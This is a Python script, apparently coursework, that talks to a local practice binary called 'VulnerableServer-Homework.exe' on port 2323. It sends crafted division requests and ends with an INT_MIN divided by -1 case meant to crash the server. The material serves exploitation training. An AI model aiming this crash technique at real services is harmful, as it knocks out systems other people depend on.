import socket
import sys
import struct

HOST = '127.0.0.1' ## The  host
PORT = 2323       # The same port as used by the server


MAGIC_1 = 0x484F4D45 # HOME
MAGIC_2 = 0x574F524B # WORK

REMAINDER = 1         # Any value < 0x18 will be a remainder and used as index into this buffer
MAGIC_3 = 0x00695744  # This is the course number 0x00695744
DIVISOR = 0xffffffff  # Divisor ; we want this to be -1
PAD = 1               # Unused byte that needs to be here for padding
DIVIDEND = 0x80000000 # Dividend ; INT_MIN (smallest signed integer -2^31)

def remote_division( dividend, divisor):

	#
	# Create a socket..
	# We use AF_INET : Address Family Internet (TCP/IP)
	# We use SOCK_STREAM : This is connection-oriented (e.g. TCP)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)

	#
	# Ignoring erors, we will attempt to connect to the 
	# host, HOST, on port, PORT
	# From our RE of VulnerableServer-Homework.exe, we know that it listens
	# on port 2323.
	s.connect( (HOST,PORT) )
	
	minlen = 0
	#
	# Send the 8-byte magic for the first recv()
	data = struct.pack("<LL", MAGIC_1, MAGIC_2 )
	s.sendall( data )
	minlen = len(data)

	#
	# Send the remaining data for the next recv()
	data = struct.pack("<BLLBL", REMAINDER, MAGIC_3, divisor, PAD, dividend )
	s.sendall(data)
	minlen += len(data)
	
	print 'Minimum is %d' % minlen
	
	try:
		#
		# receive the data back from the server.
		data = s.recv(4)
		
		# 
		# If we get data back it will be a result of a division
		val = struct.unpack('<I', data)[0]
		
		print 'Quotient is %d' % val
		
	except:
		print 'Server crashed or unresponsive'
		
	s.close()

def remote_division_single_send( dividend, divisor ):

	#
	# Create a socket..
	# We use AF_INET : Address Family Internet (TCP/IP)
	# We use SOCK_STREAM : This is connection-oriented (e.g. TCP)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)

	#
	# Ignoring erors, we will attempt to connect to the 
	# host, HOST, on port, PORT
	# From our RE of VulnerableServer-Homework.exe, we know that it listens
	# on port 2323.
	s.connect( (HOST,PORT) )
	
	#
	# We can also send all the data at once.
	data = struct.pack("<LLBLLBL", MAGIC_1, MAGIC_2, REMAINDER, MAGIC_3, divisor, PAD, dividend )
	print 'Minimum is %d' % len(data)
	s.sendall(data)
	
	try:
		#
		# receive the data back from the server.
		data = s.recv(4)
		
		# 
		# If we get data back it will be a result of a division
		val = struct.unpack('<I', data)[0]
		
		print 'Quotient is %d' % val
		
	except:
		print 'Server crashed or unresponsive'
		
	s.close()


if __name__ == '__main__':

	remote_division( 0x20, 3 ) # should print 10

	remote_division_single_send( 0x20, 4 ) # should print 8
	
	# Can only execute one of the two
	#remote_division( 0x80000000, 0xffffffff ) # should cras
	remote_division_single_send( 0x80000000, 0xffffffff ) # should crash







